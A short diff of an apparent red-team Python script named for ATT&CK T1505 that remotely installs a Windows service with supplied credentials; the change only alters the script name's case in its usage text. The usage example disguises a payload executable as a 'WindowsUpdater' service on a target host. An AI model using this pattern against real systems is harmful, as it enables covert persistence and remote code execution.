@@ -44,8 +44,8 @@ def install_service(target, username, password, domain, service_name, display_na
 
 if __name__ == '__main__':
     if len(sys.argv) != 7:
-        print("Usage: ./t1505_install_service.py <target> <username> <password> <domain> <service_name> <command>")
-        print("Example: ./t1505_install_service.py 192.168.1.100 user pass CORP 'WindowsUpdater' 'C:\\windows\\temp\\payload.exe'")
+        print("Usage: ./T1505_install_service.py <target> <username> <password> <domain> <service_name> <command>")
+        print("Example: ./T1505_install_service.py 192.168.1.100 user pass CORP 'WindowsUpdater' 'C:\\windows\\temp\\payload.exe'")
         sys.exit(1)
     
     install_service(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[5], sys.argv[6])
